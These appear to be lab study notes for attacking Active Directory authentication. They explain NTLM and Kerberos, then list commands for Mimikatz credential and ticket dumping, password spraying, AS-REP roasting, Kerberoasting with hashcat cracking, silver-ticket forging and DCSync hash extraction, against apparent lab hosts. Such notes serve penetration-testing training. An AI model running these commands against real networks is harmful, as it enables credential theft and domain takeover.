# Attacking Active Directory Authentication

## Understanding Active Directory Authentication

### NTLM Authentication

NTLM is used when:

- The client authenticates to a server via IP.
- The client authenticates to a hostname not registered on the AD DNS.

**Process:**

1. Client calculates NTLM hash from the user's password.
2. Sends username to the server.
3. Server returns a nonce (challenge).
4. Client encrypts nonce using the NTLM hash (response).
5. Client sends the response to the server.
6. Server forwards the response, username, and nonce to the domain controller.
7. Domain controller encrypts nonce with the NTLM hash from the username and compares it to the response.

**Notes:**

- NTLM is non-reversible and fast, making it crackable.
- NTLM is still used due to legacy application support.

### Kerberos Authentication

**Overview:**

- Kerberos v5 (MIT) implemented by Microsoft.
- In use since Windows Server 2003.
- Uses tickets via Key Distribution Center (KDC) on the domain controller.

**Authentication Steps:**

1. User logs into workstation.
2. Sends AS-REQ (timestamp encrypted with password hash).
3. DC looks up password hash in `ntds.dit`, decrypts timestamp.
4. If valid, DC returns AS-REP with session key and TGT (Ticket Granting Ticket).
5. TGT encrypted using NTLM hash of `krbtgt` account.

**Accessing a Resource:**

1. Client sends TGS-REQ (includes TGT, resource name, timestamp).
2. KDC validates TGT, extracts session key, decrypts TGS-REQ.
3. If all checks pass, returns TGS-REP with service ticket and new session key.
4. Client sends AP-REQ to the resource server.
5. Server validates service ticket and grants access based on group membership.

### Cached AD Credentials

- Password hashes are stored in LSASS (Local Security Authority Subsystem Service).
- LSASS runs as SYSTEM and contains memory structures for hashes.

**Tool: Mimikatz**

```powershell
privilege::debug
sekurlsa::logonpasswords
```

**Credential Types by OS:**

- Windows 2003: NTLM only.
- Windows 2008+: NTLM & SHA-1.
- Windows 7 or WDigest enabled: plaintext password retrievable.

**Dump Tickets:**

```powershell
sekurlsa::tickets
```

- Service ticket compromise = access to that service.
- TGT compromise = ability to request new TGS.

**Export/Import Tickets:**

```powershell
kerberos::ptt <ticket_file>
```

### AD Certificate Services

- Implemented via AD CS.
- Provides certificate-based authentication and HTTPS.
- Non-exportable private keys can be extracted using:

```powershell
crypto::capi
crypto::cng
```

---

## Performing Attacks on AD Authentication

### Password Attacks

**Domain Policy Check:**

```powershell
net accounts
```

Focus on: Lockout threshold, observation window.

#### 1. LDAP & ADSI (Low and Slow)

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://" + $PDC + "/DC=$($domainObj.Name.Replace('.', ',DC='))"
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "<username>", "<password>")
```

If password correct: returns `distinguishedName` If incorrect: throws exception

Use `Spray-Passwords.ps1` on `CLIENT75`:

```powershell
-File
-Pass
-Admin
```

#### 2. SMB Attack (Loud)

```bash
crackmapexec smb <target> -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

#### 3. Kerberos TGT Brute Force

- Lightweight: 2 UDP frames
- Uses `AS-REQ` only

**Tool: kerbrute**

```bash
kerbrute_windows_amd64.exe passwordspray -d corp.com usernames.txt 'Nexus123!'
```

### AS-REP Roasting

- Exploits users with "Do not require Kerberos preauthentication"
- Offline brute-force attack

**Linux (Impacket):**

```bash
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete
```

**Windows (Rubeus):**

```powershell
Rubeus.exe asreproast /nowrap
```

**Crack with hashcat:**

```bash
hashcat -m 18200 hashes.asreproast rockyou.txt -r best64.rule --force
```

### Kerberoasting

- Targets SPNs (service accounts)
- DC does not verify service ticket request, only during connection

**Windows (Rubeus):**

```powershell
Rubeus.exe kerberoast /outfile:hashes.tgsrep
```

**Linux (Impacket):**

```bash
impacket-GetUserSPNs -request -dc-ip <DC IP> corp.com/username
```

**Crack with hashcat:**

```bash
hashcat -m 13100 hashes.tgsrep rockyou.txt
```

### Silver Tickets

- Service apps rarely validate PAC
- Requires:
  - SPN account NTLM hash
  - Domain SID
  - Target SPN name

**Check access to resource:**

```powershell
iwr -UseDefaultCredentials http://<service>
```

**Mimikatz:**

```powershell
privilege::debug
sekurlsa::logonpasswords
whoami /user
kerberos::golden /sid:<SID> /domain:<domain> /ptt /target:<host> /service:<type> /rc4:<NTLM> /user:<user>
klist
```

**SID Format:** Ignore the last `-xxxx`, use base SID only.

**PAC Patch:**

- Since Oct 11, 2022: PAC\_REQUESTOR must be validated, so forging for non-existent users is blocked.

### Domain Controller Synchronization (DCSync)

- Uses DRS protocol via `IDL_DRSGetNCChanges`
- Requires privileges:
  - Replicating Directory Changes
  - Replicating Directory Changes All
  - Replicating Directory Changes in Filtered Set

**Groups with Privileges:** Domain Admins, Enterprise Admins, Administrators

**Mimikatz:**

```powershell
lsadump::desync /user:<domain\user>
lsadump::dcsync /user:<domain\user>
```

**Linux (Impacket):**

```bash
impacket-secretsdump -just-dc-user <username> corp.com/<user>:"<password>"@<ip>
```

**Example:**

```bash
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```

